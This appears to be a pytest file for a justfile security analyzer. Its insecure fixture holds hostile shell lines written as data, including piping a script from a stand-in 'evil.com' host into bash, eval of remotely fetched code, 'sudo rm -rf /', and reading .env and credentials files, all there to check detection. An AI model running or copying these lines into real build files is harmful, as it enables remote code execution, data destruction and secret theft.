"""Tests for JustAnalyzer."""

from pathlib import Path

from devai.just_analyzer import JustAnalyzer, JustFinding


INSECURE_JUSTFILE = """\
# Insecure justfile
export api_key := "hardcoded-secret-token-12345"
export database_password := "leaked-db-password"

default:
    @just --list

deploy:
    curl http://evil.com/install.sh | bash
    sudo rm -rf /
    chmod 777 /tmp
    git push origin main --force
    eval "$(curl http://evil.com/hook.sh)"
    curl --insecure https://example.com
    export GIT_SSL_NO_VERIFY=1
    cat .env
    cat credentials.json

[script]
    echo "arbitrary script"

import 'http://evil.com/justfile'
"""

HARDENED_JUSTFILE = """\
default:
    just --list

install:
    pip install -e ".[dev]"

test:
    python -m pytest

lint:
    ruff check src tests
"""


class TestJustAnalyzer:
    def test_detects_insecure_justfile(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "destructive_rm" in kinds
        assert "sudo_usage" in kinds
        assert "chmod_777" in kinds
        assert "force_push" in kinds
        assert "eval_usage" in kinds
        assert "insecure_http" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "sensitive_path" in kinds
        assert "script_shebang" in kinds
        assert "insecure_import" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_justfile_passes(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert not high
        assert analyzer.health_score() >= 90.0

    def test_no_justfiles_returns_perfect_score(self, tmp_path: Path):
        analyzer = JustAnalyzer(str(tmp_path))
        assert analyzer.justfiles() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = JustFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="justfile",
            lineno=3,
            line="export api_key := bad",
        )
        assert "[high]" in finding.format()
        assert "justfile:3" in finding.format()

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Justfile analysis:" in context
        assert "health score:" in context
        assert "hardcoded_secret" in context or "[high]" in context

    def test_generate_hardened_template(self):
        analyzer = JustAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "just --list" in template
        assert "curl | sh" in template

    def test_detects_just_subdir(self, tmp_path: Path):
        just_dir = tmp_path / "just"
        just_dir.mkdir()
        (just_dir / "deploy.just").write_text(
            "export SECRET_TOKEN := \"leaked-token\"\n",
            encoding="utf-8",
        )
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "hardcoded_secret" for f in findings)

    def test_detects_justfile_case_variants(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text(
            "export API_KEY := \"case-variant-secret\"\n",
            encoding="utf-8",
        )
        analyzer = JustAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "hardcoded_secret" for f in findings)
